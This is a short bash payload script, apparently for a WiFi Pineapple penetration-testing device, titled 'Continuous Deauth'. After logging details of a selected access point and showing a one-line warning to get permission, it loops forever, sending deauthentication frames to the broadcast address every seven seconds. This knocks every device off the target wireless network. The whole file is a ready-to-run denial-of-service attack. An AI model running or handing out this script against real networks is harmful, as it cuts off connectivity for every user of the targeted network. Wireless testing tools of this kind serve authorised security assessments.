#!/bin/bash

#Title: Continuous Deauth
#Description: Payload to continuously deauth all devices off of a network.
# Author: Jestsec
# Version: 1

LOG "Deauth All Devices off of $_RECON_SELECTED_AP_SSID"

/usr/bin/log "AP Information"

LOG "AP MAC: $_RECON_SELECTED_AP_MAC_ADDRESS"
LOG "Client Count: $_RECON_SELECTED_AP_CLIENT_COUNT"
LOG "Access Point is currently broadcasting on channel: $_RECON_SELECTED_AP_CHANNEL"
ALERT "This will kick all devices currently trying to connect to this access point, as well as any device that tries to connect to it. Stay legal and get permission before running this"

LOG "Starting to DEAUTH ALL DEVICES"
LOG " To Stop Deauth attack exit this payload"
while true;do
	PINEAPPLE_DEAUTH_CLIENT $_RECON_SELECTED_AP_MAC_ADDRESS ff:ff:ff:ff:ff:ff $_RECON_SELECTED_AP_CHANNEL
	sleep 7
done

LOG "Deauth attack stopped"
